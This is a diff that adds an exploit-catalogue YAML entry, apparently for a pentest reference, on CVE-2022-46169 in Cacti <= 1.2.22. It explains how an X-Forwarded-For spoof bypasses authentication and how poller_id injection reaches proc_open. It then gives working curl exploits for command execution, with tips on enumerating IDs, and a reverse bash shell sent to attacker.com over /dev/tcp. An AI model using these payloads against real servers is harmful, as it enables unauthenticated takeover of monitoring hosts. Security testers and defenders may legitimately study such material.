@@ -1,0 +1,55 @@
+---
+comment: |
+  Cacti is an open-source network monitoring and graphing solution. CVE-2022-46169
+  chains an authentication bypass with a command injection vulnerability in
+  remote_agent.php. The endpoint validates the caller's IP against the Cacti
+  database; the X-Forwarded-For header bypasses this check. The poller_id
+  parameter is appended unsanitized to a shell command string passed to proc_open.
+  Affects Cacti <= 1.2.22. Listed in the CISA KEV catalog.
+functions:
+  rce:
+  - code: |
+      # Enumerate valid host_id and local_data_ids values (increment if first attempt fails)
+      curl -s -G "http://victim.com/cacti/remote_agent.php" \
+        --data-urlencode "action=polldata" \
+        --data-urlencode "local_data_ids[0]=1" \
+        --data-urlencode "host_id=1" \
+        --data-urlencode "poller_id=;id" \
+        -H "X-Forwarded-For: 127.0.0.1"
+    comment: |
+      CVE-2022-46169: the poller_id GET parameter in remote_agent.php is concatenated
+      into a shell command string without sanitization, then passed to proc_open.
+      The X-Forwarded-For header spoofs the client IP as 127.0.0.1, satisfying the
+      IP-based authentication check that restricts access to trusted Cacti servers.
+
+      host_id and local_data_ids[0] must reference an existing monitored host and its
+      associated data source in the Cacti database. Default installs with at least one
+      monitored device typically have host_id=1 and local_data_ids[0]=1. Increment
+      both values (1, 2, 3...) if the initial attempt returns no output.
+
+      Command output is returned inline in the HTTP response body.
+      Ref: https://www.exploit-db.com/exploits/51166
+    contexts:
+      unauthenticated:
+    version: |-
+      <= 1.2.22
+  reverse-shell:
+  - blind: true
+    code: |
+      curl -s -G "http://victim.com/cacti/remote_agent.php" \
+        --data-urlencode "action=polldata" \
+        --data-urlencode "local_data_ids[0]=1" \
+        --data-urlencode "host_id=1" \
+        --data-urlencode "poller_id=;bash -c 'bash -i >& /dev/tcp/attacker.com/12345 0>&1' &" \
+        -H "X-Forwarded-For: 127.0.0.1"
+    comment: |
+      CVE-2022-46169: spawns a reverse bash shell via the poller_id command injection.
+      The trailing & detaches the shell from the process group so the HTTP request
+      completes normally. The shell runs as the web server user (www-data, apache, or cacti).
+    contexts:
+      unauthenticated:
+    listener: tcp-server
+    tty: false
+    version: |-
+      <= 1.2.22
+...
